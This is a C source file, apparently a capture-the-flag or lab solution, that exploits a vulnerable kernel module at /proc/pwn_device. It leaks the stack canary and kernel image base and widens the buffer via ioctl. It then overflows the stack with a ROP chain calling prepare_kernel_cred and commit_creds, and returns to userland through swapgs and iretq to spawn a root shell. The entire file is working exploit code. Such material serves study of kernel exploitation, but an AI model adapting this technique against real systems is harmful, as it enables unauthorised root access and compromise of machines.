#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <signal.h>

int fd;

void open_device(void) {
    puts("[*] Opening pwn_device");
    fd = open("/proc/pwn_device", O_RDWR);
    if (fd < 0) {
        puts("[!] Failed to open device");
        exit(-1);
    }
    printf("[+] Device opened successfully, fd: %d\n", fd);
} 

void close_device(void) {
    if(close(fd) == -1) {
        puts("[!] Error closing the device");
        exit(-1);
    }
    puts("[+] Device closed");
}

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

unsigned long canary, IMAGE_BASE;

void leak_stack(void) {
    unsigned long leak[20];
    read(fd, leak, sizeof(leak));
    // for(int i = 0; i<=20; i++) {
    //     printf("[*] leak[%d] = 0x%lx\n", i, leak[i]);
    // }
    canary = leak[16];
    printf("[+] Stack canary: 0x%lx\n", canary);
    printf("[+] Original return address: 0x%lx\n", leak[18]);
    IMAGE_BASE = leak[18] - 0x23e347UL;
    printf("[+] IMAGE_BASE: 0x%lx\n", IMAGE_BASE);
}

int MaxBuffer = 300;

void change_max_buffer(void) {
    if (ioctl(fd, 0x20, MaxBuffer) == -1) {
        puts("[!] Error calling ioctl");
        exit(-1);
    }
    printf("[+] MaxBuffer changed to %d\n", MaxBuffer);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        close_device();
        exit(0);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long pop_rdi, swapgs_popfq, iretq, prepare_kernel_cred, commit_creds;

void calculate_offsets() {
    pop_rdi = IMAGE_BASE + 0x1518UL;
    swapgs_popfq = IMAGE_BASE + 0xc00eaaUL;
    iretq = IMAGE_BASE + 0x23cc2UL;
    prepare_kernel_cred = IMAGE_BASE + 0x881c0UL;
    commit_creds = IMAGE_BASE + 0x87e80UL;
}


void overwrite_return_address(void) {
    unsigned long payload[(int)MaxBuffer/8];
    unsigned offset = 16; // 128 / 8
    payload[offset++] = canary;
    payload[offset++] = 0x0;
    payload[offset++] = pop_rdi;
    payload[offset++] = 0x0;
    payload[offset++] = prepare_kernel_cred;
    payload[offset++] = commit_creds;
    payload[offset++] = swapgs_popfq;
    payload[offset++] = 0x0;
    payload[offset++] = iretq;
    payload[offset++] = user_rip;
    payload[offset++] = user_cs;
    payload[offset++] = user_rflags;
    payload[offset++] = user_sp;
    payload[offset++] = user_ss;
    puts("[*] Calling write");
    write(fd, payload, sizeof(payload));
}

int main(){
    save_state();
    open_device();
    leak_stack();
    change_max_buffer();
    calculate_offsets();
    signal(SIGSEGV, get_shell);
    overwrite_return_address();
    close_device();
}
